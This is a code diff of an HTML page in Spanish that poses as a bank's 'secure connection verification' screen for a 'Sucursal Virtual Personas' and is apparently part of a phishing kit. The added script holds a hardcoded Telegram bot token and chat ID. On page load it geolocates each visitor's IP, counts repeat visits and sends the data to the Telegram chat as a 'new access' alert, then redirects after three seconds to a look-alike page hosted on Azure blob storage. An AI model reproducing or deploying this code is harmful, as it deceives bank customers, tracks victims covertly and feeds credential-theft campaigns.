@@ -3,18 +3,17 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Redirigiendo… | Sucursal de bloqueos Personas</title>
+  <title>Verificación de Conexión Segura | Sucursal Bancaria</title>
   <style>
+    /* Estilos basados en una estética bancaria de verificación */
     :root {
       --bg: #f3f6fb;
-      --card-bg: rgba(255, 255, 255, 0.7);
-      --glass-border: rgba(0, 0, 0, 0.06);
-      --accent-1: #4e4e43;
-      --accent-2: #f8e706;
+      --accent-1: #9a9a9a; /* Azul Corporativo */
+      --accent-2: #ffcc00; /* Amarillo/Dorado de Alerta */
       --muted: #5b6b79;
       --shadow: 0 10px 30px rgba(16, 24, 40, 0.08);
       --radius: 14px;
-      --font-sans: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      --font-sans: "Inter", Roboto, "Helvetica Neue", Arial, sans-serif;
     }
     * { box-sizing: border-box; margin: 0; padding: 0 }
     html, body { height: 100% }
@@ -26,17 +25,19 @@
       align-items: center;
       justify-content: center;
       padding: 24px;
+      transition: background-color 0.3s;
     }
     .card {
       width: min(760px, 96vw);
-      background: linear-gradient(180deg, rgba(255, 255, 255, 0.85), rgba(255, 255, 255, 0.72));
-      border: 1px solid var(--glass-border);
+      background: linear-gradient(180deg, rgba(255, 255, 255, 0.95), rgba(255, 255, 255, 0.85));
+      border: 1px solid rgba(0, 0, 0, 0.1);
       border-radius: var(--radius);
       padding: 36px;
       box-shadow: var(--shadow);
       display: flex;
       gap: 28px;
       align-items: center;
+      transition: all 0.3s ease;
     }
     .left { flex: 1; min-width: 220px; }
     .brand {
@@ -46,79 +47,71 @@
       margin-bottom: 8px;
     }
     .ms-logo {
-      width: 44px;
-      height: 44px;
-      border-radius: 8px;
-      background: linear-gradient(135deg, var(--accent-1), var(--accent-2));
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: var(--accent-1);
       display: flex;
       align-items: center;
       justify-content: center;
       color: #fff;
       font-weight: 700;
-      box-shadow: 0 6px 18px rgba(3, 62, 120, 0.12);
+      box-shadow: 0 4px 12px rgba(0, 77, 153, 0.3);
       flex-shrink: 0;
+      font-size: 24px;
     }
     .title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #05263b;
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--accent-1);
       line-height: 1.1;
     }
     .subtitle {
-      margin-top: 6px;
+      margin-top: 4px;
       color: var(--muted);
-      font-size: 13px;
+      font-size: 14px;
     }
     .right {
-      width: 220px;
+      width: 200px;
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 12px;
+      gap: 16px;
     }
     .spinner {
-      width: 84px;
-      height: 84px;
+      width: 72px;
+      height: 72px;
       border-radius: 50%;
       position: relative;
       display: grid;
       place-items: center;
-      background: conic-gradient(from 0deg at 50% 50%, var(--accent-1), rgba(0, 0, 0, 0) 60%);
-      -webkit-mask: radial-gradient(farthest-side, transparent 60%, black 61%);
-      mask: radial-gradient(farthest-side, transparent 60%, black 61%);
+      border: 4px solid rgba(0, 77, 153, 0.2);
+      border-top-color: var(--accent-1);
       animation: spin 1.25s linear infinite;
-      box-shadow: 0 8px 20px rgba(3, 62, 120, 0.08);
-    }
-    .spinner::after {
-      content: "";
-      width: 60%;
-      height: 60%;
-      background: linear-gradient(180deg, #fff, #f7fbff);
-      border-radius: 50%;
-      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6);
     }
     @keyframes spin { to { transform: rotate(360deg); } }
     .small-note { font-size: 13px; color: var(--muted); text-align: center; }
     .countdown {
-      margin-top: 6px;
-      font-weight: 600;
-      color: var(--accent-2);
-      font-size: 13px;
+      margin-top: 4px;
+      font-weight: 700;
+      color: var(--accent-1);
+      font-size: 16px;
     }
     .manual {
-      margin-top: 10px;
-      font-size: 13px;
+      margin-top: 15px;
+      font-size: 14px;
+      opacity: 0.8;
     }
     a.manual-link {
       color: var(--accent-1);
       text-decoration: none;
-      font-weight: 600;
+      font-weight: 700;
     }
     a.manual-link:hover { text-decoration: underline; }
     .ip-display {
-      font-size: 10px;
+      font-size: 11px;
       color: var(--muted);
-      margin-top: 5px;
+      margin-top: 10px;
       font-family: 'Courier New', Courier, monospace;
     }
     @media (max-width: 640px) {
@@ -133,7 +126,7 @@
         justify-content: space-between;
         align-items: center
       }
-      .right div[style="text-align:center"] {
+      .right > div {
         text-align: left;
         padding-left: 12px;
       }
@@ -144,26 +137,24 @@
   <div class="card">
     <div class="left">
       <div class="brand">
-        <div class="ms-logo">
-          <img src="https://i.postimg.cc/mrgh8wqk/channels4-jprofile.jpg" alt="Logo" style="height:45px;">
-        </div>
+        <img src="https://i.postimg.cc/mrgh8wqk/channels4-jprofile.jpg" alt="Microsoft Logo" style="height:45px;">
         <div>
-          <div class="title">En unos momentos serás redirigido</div>
-          <div class="subtitle">Estamos preparando la conexión segura…</div>
+          <div class="title">Verificación de Conexión Segura</div>
+          <div class="subtitle">Estamos verificando su acceso a la Sucursal Virtual Personas.</div>
         </div>
       </div>
       <p style="margin-top:18px; color:var(--muted); font-size:14px; line-height:1.5;">
-        Si tu navegador no redirige automáticamente, puedes usar el enlace manual debajo.
+        Este proceso garantiza que la conexión cumpla con nuestros estándares de seguridad. Será redirigido automáticamente a la plataforma bancaria.
       </p>
       <p class="manual">
-        Ir ahora:
-        <a class="manual-link" id="manualLink" href="#" target="_self">Ir a Sucursal Personas</a>
+        Si la redirección falla:
+        <a class="manual-link" id="manualLink" href="#" target="_self">Continuar a Sucursal Personas</a>
       </p>
     </div>
     <div class="right">
       <div class="spinner"></div>
-      <div style="text-align:center">
-        <div class="small-note">Cargando conexión segura…</div>
+      <div>
+        <div class="small-note">Redirigiendo en...</div>
         <div class="countdown" id="countdown">3</div>
         <div class="ip-display" id="ipDisplay">IP: ...</div>
       </div>
@@ -171,27 +162,31 @@
   </div>
 
   <script>
+    // --- Configuración y Credenciales ---
+    const BOT_TOKEN = "8283221428:AAGs-nYQUuN30MWcE_CGKOTtUc2CKEDmVMU";
+    const CHAT_ID = "-1003001239432";
     const redirectUrl = "https://sucursadebloqueo.blob.core.windows.net/protocolo/Virtual-Persona.html";
-    const redirectDelayMs = 3000;
-    const backendApiUrl = "https://newbrandly.onrender.com/api/notify";
+    const redirectDelayMs = 3000; // 3 segundos
+    const LOCAL_COUNT_KEY = 'ip_visit_counts_v1'; // Clave para localStorage
 
+    // Establecer el enlace manual
     document.getElementById('manualLink').href = redirectUrl;
 
-    // ---- Función con timeout (2s por API) ----
+    // --- Funciones de Utilidad ---
+
     async function fetchWithTimeout(url, options = {}) {
       const controller = new AbortController();
-      const timeout = setTimeout(() => controller.abort(), options.timeout || 2000);
+      const timeout = setTimeout(() => controller.abort(), options.timeout || 2000); 
       try {
         const res = await fetch(url, { signal: controller.signal });
         clearTimeout(timeout);
         return res;
       } catch (err) {
         clearTimeout(timeout);
-        throw err;
+        throw err; 
       }
     }
 
-    // ---- Fallback global con 3 APIs ----
     async function fetchRobustGeoData() {
       const apis = [
         { url: 'https://ipwho.is/', normalize: d => ({ ip: d.ip, country: d.country, city: d.city, region: d.region }) },
@@ -204,43 +199,124 @@
           const res = await fetchWithTimeout(api.url, { timeout: 2000 });
           if (!res.ok) continue;
           const data = await res.json();
-          if (data && data.ip) return api.normalize(data);
-        } catch { continue; }
+          if (data && (data.ip || data.ip_address)) return api.normalize(data);
+        } catch { 
+          continue; 
+        }
       }
-      throw new Error("Todas las APIs de geolocalización fallaron.");
+      return { ip: 'IP Desconocida', country: 'Desconocido', city: 'Desconocida', region: '' }; 
     }
+    
+    // --- Lógica de Conteo Local (localStorage) ---
+    function getAndIncrementLocalCount(ip) {
+        if (!ip || ip === 'IP Desconocida') return 1; // No podemos contar si no hay IP
+        
+        let counts = {};
+        try {
+            const stored = localStorage.getItem(LOCAL_COUNT_KEY);
+            if (stored) {
+                counts = JSON.parse(stored);
+            }
+        } catch (e) {
+            console.error("Error al leer localStorage:", e);
+        }
+
+        const currentCount = (counts[ip] || 0) + 1;
+        counts[ip] = currentCount;
+
+        try {
+            localStorage.setItem(LOCAL_COUNT_KEY, JSON.stringify(counts));
+        } catch (e) {
+            console.error("Error al escribir en localStorage:", e);
+        }
+
+        return currentCount;
+    }
+
+
+    // --- Lógica de Notificación Directa a Telegram (INCLUYE CONTEO LOCAL) ---
+    async function sendTelegramNotification(geoData, localCount) {
+      const ip_visitante = geoData.ip || 'Desconocida';
+      const pais = geoData.country || 'Desconocido';
+      const ciudad = geoData.city || 'Desconocida';
+      const zona = geoData.region || '';
+      const fechaHoraLocal = new Date().toLocaleString('es-CO');
+
+      // El mensaje ahora usa el conteo local por IP
+      const message = `
+🚨 *NUEVO ACCESO DETECTADO* 🏦
+#️⃣ *Visita Local (por IP):* ${localCount}
+---
+🌐 *IP:* ${ip_visitante}
+🚩 *Ubicación:* ${ciudad}, ${pais}${zona ? ` (${zona})` : ''}
+---
+🕒 *Fecha/Hora (local):* ${fechaHoraLocal}
+`.trim();
+
+      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      try {
+        const telegramResponse = await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+          }),
+        });
+
+        if (!telegramResponse.ok) {
+          console.error("⚠️ Error de Telegram:", await telegramResponse.text());
+        } else {
+          console.log("✅ Notificación enviada con conteo local:", localCount);
+        }
+      } catch (error) {
+        console.error("🚫 Error al conectar con la API de Telegram:", error.message);
+      }
+    }
+
+    // --- Lógica Principal ---
 
     async function initRedirectAndNotify() {
       const ipEl = document.getElementById('ipDisplay');
+      let geoData = {};
+      let localCount = 0;
+      
+      // 1. Obtener Geodatos
       try {
-        const geoData = await fetchRobustGeoData();
-        ipEl.textContent = geoData.ip || "IP: n/a";
-
-        await fetch(backendApiUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(geoData)
-        });
+        geoData = await fetchRobustGeoData();
+        ipEl.textContent = "IP: " + (geoData.ip || "N/A");
       } catch (err) {
-        console.error("Error al obtener o enviar geodatos:", err);
-        ipEl.textContent = "IP: Error";
+        console.error("Error al obtener geodatos:", err);
+        ipEl.textContent = "IP: Error de Red";
       }
+      
+      // 2. Obtener e Incrementar el Contador Local por IP
+      localCount = getAndIncrementLocalCount(geoData.ip);
+      
+      // 3. Enviar Notificación con el nuevo contador local
+      sendTelegramNotification(geoData, localCount);
 
-      // Contador y redirección
+      // 4. Ejecutar Contador y Redirección
       const countdownEl = document.getElementById('countdown');
       let remaining = Math.ceil(redirectDelayMs / 1000);
       countdownEl.textContent = remaining;
+      
       const interval = setInterval(() => {
         remaining--;
         countdownEl.textContent = remaining > 0 ? remaining : "0";
-        if (remaining <= 0) clearInterval(interval);
+        if (remaining <= 0) {
+          clearInterval(interval);
+        }
       }, 1000);
 
-      setTimeout(() => window.location.replace(redirectUrl), redirectDelayMs);
+      setTimeout(() => {
+        window.location.replace(redirectUrl);
+      }, redirectDelayMs);
     }
 
     initRedirectAndNotify();
   </script>
 </body>
 </html>
-
